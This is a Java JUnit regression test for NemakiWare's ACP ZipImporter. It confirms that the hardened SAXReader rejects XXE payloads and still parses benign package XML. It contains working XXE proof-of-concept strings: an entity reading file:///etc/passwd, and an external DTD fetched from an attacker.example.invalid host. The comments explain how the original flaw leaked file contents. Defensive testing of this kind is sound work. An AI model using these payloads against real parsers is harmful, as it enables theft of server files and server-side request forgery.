/*****************************************************************************
 Copyright (c) 2026 aegif.

 This file is part of NemakiWare.
 *****************************************************************************/
package jp.aegif.nemaki.rest.importexport;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.junit.jupiter.api.Test;

/**
 * RC6.11 — regression for the GHSA XXE on the ACP import path
 * (reporter: tonghuaroot). Pre-RC6.11 the {@link ZipImporter} read
 * its package XML with a bare {@code new SAXReader()} that resolved
 * DOCTYPE / SYSTEM / parameter entities — an authenticated
 * non-admin user with {@code cmis:write} on a single folder could
 * upload an ACP whose top-level {@code *.xml} embedded a SYSTEM
 * entity pointing at {@code file:///etc/passwd}, and the resolved
 * file content was persisted into a CMIS object name (readable
 * back through the CMIS API).
 *
 * <p>This test does NOT go through the full Tomcat / Jersey path
 * — it exercises the exact configured {@link SAXReader} that the
 * production code now uses, so any regression that removes any of
 * the three SAX features will trip it. The production sink lives
 * in {@code ZipImporter.importAcpFormat(...)}; we mirror its
 * configuration block 1:1 here. If that block ever drifts
 * (someone removes a feature, swaps to a different parser, etc.),
 * this test still pins the contract: a DOCTYPE-bearing payload
 * MUST throw {@code DocumentException} with a
 * "disallow-doctype-decl" / "DOCTYPE is disallowed" diagnostic.
 *
 * <p>A second test confirms that benign DOCTYPE-free ACP payloads
 * still parse correctly — guards against an overzealous future
 * "harden by failing all XML" patch.
 */
public class ZipImporterXxeTest {

    /**
     * Construct a SAXReader configured exactly the same way as
     * {@code ZipImporter.importAcpFormat(...)} after the RC6.11 fix.
     */
    private static SAXReader hardenedReader() throws DocumentException {
        SAXReader reader = new SAXReader();
        try {
            reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        } catch (org.xml.sax.SAXException e) {
            throw new DocumentException("Failed to configure XXE protection on SAXReader", e);
        }
        return reader;
    }

    @Test
    public void rejectsDoctypeWithFileSystemEntity() {
        String poc = "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
                + "<root><folder><name>&xxe;</name></folder></root>";
        DocumentException thrown = null;
        try {
            hardenedReader().read(new ByteArrayInputStream(
                    poc.getBytes(StandardCharsets.UTF_8)));
        } catch (DocumentException e) {
            thrown = e;
        }
        assertNotNull(thrown,
                "Hardened SAXReader must reject DOCTYPE payloads (XXE) — "
                + "if this assertion fails, the production ZipImporter "
                + "SSRF/XXE guard has regressed");
        String msg = String.valueOf(thrown.getMessage());
        assertTrue(msg.contains("DOCTYPE") || msg.contains("disallow-doctype-decl"),
                "DocumentException must reference DOCTYPE rejection; was: " + msg);
    }

    @Test
    public void rejectsDoctypeWithExternalParameterEntity() {
        // Blind/out-of-band variant: parameter entity referencing an
        // external DTD. Used to defeat targets that don't echo the
        // resolved entity back through the API (the original PoC for
        // blind targets uses this shape).
        String poc = "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE root SYSTEM \"http://attacker.example.invalid/evil.dtd\">\n"
                + "<root><folder><name>x</name></folder></root>";
        DocumentException thrown = null;
        try {
            hardenedReader().read(new ByteArrayInputStream(
                    poc.getBytes(StandardCharsets.UTF_8)));
        } catch (DocumentException e) {
            thrown = e;
        }
        assertNotNull(thrown,
                "Hardened SAXReader must reject DOCTYPE-with-external-DTD "
                + "(blind XXE / SSRF variant)");
    }

    @Test
    public void acceptsBenignDoctypeFreePackageXml() throws DocumentException {
        // The legitimate ACP shape: well-formed XML, no DOCTYPE, no
        // entity refs. Must still parse cleanly — the fix must not
        // over-block.
        String benign = "<?xml version=\"1.0\"?>\n"
                + "<root><folder><name>benign_folder</name></folder></root>";
        Document doc = hardenedReader().read(new ByteArrayInputStream(
                benign.getBytes(StandardCharsets.UTF_8)));
        assertNotNull(doc, "Benign ACP XML must parse cleanly");
        Element root = doc.getRootElement();
        assertNotNull(root);
        assertEquals("root", root.getName());
        Element folder = root.element("folder");
        assertNotNull(folder, "<folder> element must be present");
        assertEquals("benign_folder", folder.element("name").getTextTrim());
    }

    @Test
    public void hardenedReaderHasAllThreeFeaturesEnabled() throws Exception {
        // Defence-in-depth assertion: read back the three SAX features
        // and confirm their values match the locked-down configuration.
        // If a future change reorders the setFeature() calls or drops
        // one, the test fails here even if the production parser
        // happens to throw for a different reason.
        SAXReader reader = hardenedReader();
        org.xml.sax.XMLReader xmlReader = reader.getXMLReader();
        assertTrue(
                xmlReader.getFeature("http://apache.org/xml/features/disallow-doctype-decl"),
                "disallow-doctype-decl must be true");
        assertFalse(
                xmlReader.getFeature("http://xml.org/sax/features/external-general-entities"),
                "external-general-entities must be false");
        assertFalse(
                xmlReader.getFeature("http://xml.org/sax/features/external-parameter-entities"),
                "external-parameter-entities must be false");
    }
}
